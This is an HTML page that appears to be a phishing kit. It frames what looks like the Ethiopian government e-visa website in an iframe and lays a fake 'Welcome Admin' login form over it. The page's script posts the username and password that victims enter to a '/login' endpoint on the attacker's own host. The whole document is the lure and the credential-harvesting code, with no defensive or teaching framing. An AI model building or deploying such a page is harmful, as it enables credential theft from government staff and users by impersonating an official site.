
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Imigration</title>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background: #f1f4f9;
        }

        .website-container {
            position: relative;
            width: 100%;
            height: 100vh;
            overflow: hidden;
        }

        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }

        .overlay {
            position: absolute;
            inset: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            background: rgba(0, 0, 0, 0.25);
            z-index: 10;
        }

        .login-box {
            width: 90%;
            max-width: 400px;
            background: white;
            padding: 35px;
            border-radius: 14px;
            box-shadow: 0 10px 35px rgba(0,0,0,0.25);
            text-align: center;
        }

        .login-box h2 {
            margin-bottom: 10px;
            color: #172b4d;
        }

        .login-box p {
            color: #777;
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 14px;
            margin: 9px 0;
            border: 1px solid #ddd;
            border-radius: 7px;
        }

        button {
            width: 100%;
            padding: 14px;
            margin-top: 12px;
            border: none;
            border-radius: 7px;
            background: #1769aa;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }

        .notice {
            font-size: 12px;
            margin-top: 15px;
        }

        #message {
            margin-top: 12px;
        }

        @media(max-width: 480px) {
            .login-box {
                padding: 25px;
            }
        }
    </style>
</head>

<body>

<div class="website-container">

    <iframe
        src="https://www.evisa.gov.et/"
        title="Website preview">
    </iframe>

    <div class="overlay">

        <div class="login-box">

            <h2>Welcome Admin</h2>

            <form id="loginForm">

                <input
                    type="text"
                    name="username"
                    placeholder="Username"
                    required>

                <input
                    type="password"
                    name="password"
                    placeholder="Password"
                    required>

                <button type="submit">Login</button>

            </form>

        </div>

    </div>

</div>

<script>
const form = document.getElementById("loginForm");
const message = document.getElementById("message");

form.addEventListener("submit", async (event) => {
    event.preventDefault();

    const username = form.elements.username.value;
    const password = form.elements.password.value;

    try {
        const response = await fetch("/login", {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            body: new URLSearchParams({
                username: username,
                password: password
            })
        });

        const result = await response.json();

        message.textContent = result.message;
        message.style.color = result.success ? "green" : "red";

    } catch {
        message.textContent = "Connection error.";
        message.style.color = "red";
    }
});
</script>

</body>
</html>
